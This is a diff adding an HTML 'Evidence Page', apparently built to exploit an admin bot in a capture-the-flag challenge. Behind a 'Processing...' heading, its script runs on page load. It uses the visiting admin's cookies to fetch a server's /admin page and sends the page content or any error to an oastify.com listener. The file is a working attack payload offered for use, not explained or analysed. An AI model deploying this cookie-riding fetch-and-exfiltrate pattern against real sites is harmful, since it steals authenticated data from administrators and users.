@@ -1,0 +1,29 @@
+      
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Evidence Page</title>
+</head>
+<body>
+    <h1>Processing...</h1>
+    <script>
+        async function stealFlag() {
+            try {
+                // The bot is logged in as admin, so this fetch will have admin cookies
+                const response = await fetch('http://83.136.249.210:35975/admin'); // Fetches from the CTF server's /admin
+                const adminPageHtml = await response.text();
+
+                // Exfiltrate the content of the admin page (which contains the flag)
+                // to your listener.
+                // Replace 'YOUR_ATTACKER_IP_OR_NGROK_URL' and 'PORT_FOR_NC'
+                fetch('http://kznar4zgosgw2xwvnwrggepz0q6vulia.oastify.com/exfil?data=' + encodeURIComponent(adminPageHtml));
+            } catch (error) {
+                fetch('http://kznar4zgosgw2xwvnwrggepz0q6vulia.oastify.com/exfil?error=' + encodeURIComponent(error.toString()));
+            }
+        }
+        stealFlag();
+    </script>
+</body>
+</html>
+
+    
